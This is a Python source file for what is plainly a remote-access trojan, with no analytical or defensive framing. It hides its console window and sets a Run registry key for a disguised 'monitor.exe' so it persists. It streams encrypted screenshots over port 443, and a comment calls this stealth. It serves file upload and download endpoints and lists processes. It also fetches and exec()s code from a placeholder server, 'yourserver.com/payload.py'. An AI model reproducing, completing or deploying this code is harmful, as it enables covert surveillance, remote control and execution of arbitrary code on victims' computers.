import socket
import threading
import pyautogui
import cv2
import numpy as np
import pickle
import struct
import psutil
import os
import ssl
import subprocess
import requests
import base64
from Crypto.Cipher import AES
from flask import Flask, request, jsonify, send_from_directory
from pynput import keyboard, mouse

# Hide console window on Windows
def hide_console():
    if os.name == 'nt':
        subprocess.call('powershell -windowstyle hidden', shell=True)

hide_console()

# Run as background service on Windows
def run_as_service():
    if os.name == 'nt':
        os.system("reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"SystemMonitor\" /t REG_SZ /d \"C:\\ProgramData\\Microsoft\\monitor.exe\" /f")

run_as_service()

# Secure communication with SSL encryption
CERT_FILE = "cert.pem"
KEY_FILE = "key.pem"
context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
context.load_cert_chain(certfile=CERT_FILE, keyfile=KEY_FILE)

# AES Encryption
AES_KEY = b'16byteslongkey!!'  # Change this to a secure key

def encrypt_data(data):
    cipher = AES.new(AES_KEY, AES.MODE_EAX)
    ciphertext, tag = cipher.encrypt_and_digest(data)
    return base64.b64encode(cipher.nonce + tag + ciphertext).decode()

def decrypt_data(enc_data):
    enc_data = base64.b64decode(enc_data)
    nonce, tag, ciphertext = enc_data[:16], enc_data[16:32], enc_data[32:]
    cipher = AES.new(AES_KEY, AES.MODE_EAX, nonce=nonce)
    return cipher.decrypt_and_verify(ciphertext, tag)

# Server for monitoring
def capture_screen():
    screenshot = pyautogui.screenshot()
    frame = np.array(screenshot)
    frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
    return frame

def send_screen(client_socket):
    client_socket = context.wrap_socket(client_socket, server_side=True)
    while True:
        frame = capture_screen()
        data = encrypt_data(pickle.dumps(frame))
        size = struct.pack("Q", len(data))
        try:
            client_socket.sendall(size + data.encode())
        except:
            break

def screen_server():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(("0.0.0.0", 443))  # Use HTTPS port for stealth
    server_socket.listen(5)
    print("Screen Server Started on Port 443")
    
    while True:
        client_socket, _ = server_socket.accept()
        threading.Thread(target=send_screen, args=(client_socket,)).start()

# Flask API for process monitoring
app = Flask(__name__)

@app.route('/processes', methods=['GET'])
def list_processes():
    processes = [{"pid": p.pid, "name": p.name()} for p in psutil.process_iter()]
    return jsonify(processes)

# Keyboard & Mouse Control
def on_press(key):
    try:
        pyautogui.press(key.char)
    except AttributeError:
        pass

def on_click(x, y, button, pressed):
    if pressed:
        pyautogui.click(x, y)

def input_server():
    keyboard_listener = keyboard.Listener(on_press=on_press)
    mouse_listener = mouse.Listener(on_click=on_click)
    keyboard_listener.start()
    mouse_listener.start()
    keyboard_listener.join()
    mouse_listener.join()

# File Transfer API
UPLOAD_FOLDER = "C:\\ProgramData\\Microsoft\\"
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

@app.route('/upload', methods=['POST'])
def upload_file():
    file = request.files['file']
    file_path = os.path.join(UPLOAD_FOLDER, file.filename)
    file.save(file_path)
    return jsonify({"message": "File uploaded successfully"})

@app.route('/download/<filename>', methods=['GET'])
def download_file(filename):
    return send_from_directory(UPLOAD_FOLDER, filename, as_attachment=True)

# Dynamic Code Execution - Fetch updates from server
def fetch_remote_code():
    try:
        exec(requests.get("https://yourserver.com/payload.py").text)
    except Exception as e:
        print("Error fetching remote code:", e)

threading.Thread(target=fetch_remote_code, daemon=True).start()

if __name__ == '__main__':
    threading.Thread(target=screen_server, daemon=True).start()
    threading.Thread(target=input_server, daemon=True).start()
    app.run(host='0.0.0.0', port=5000, ssl_context=(CERT_FILE, KEY_FILE))
